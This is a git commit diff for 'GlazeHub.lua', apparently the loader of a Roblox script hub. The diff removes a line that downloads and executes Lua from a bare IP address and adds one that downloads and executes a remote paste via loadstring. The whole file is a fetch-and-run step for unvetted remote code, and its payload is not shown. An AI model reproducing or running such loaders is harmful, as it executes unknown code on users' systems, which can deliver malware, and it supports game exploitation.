c887952b967329a13b1b91c2c7e9197c2eb87fb0
GlazeScripts <outsiderout55@gmail.com>
2025-12-04 10:59:14 +0800

    Update GlazeHub.lua

--- GlazeHub.lua
+++ GlazeHub.lua
@@ -1,2 +1,1 @@
-ID="e73df7bc-de74-4456-be66-59a9b7fd0f6b";
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://pastefy.app/0VFwFqad/raw", true))()
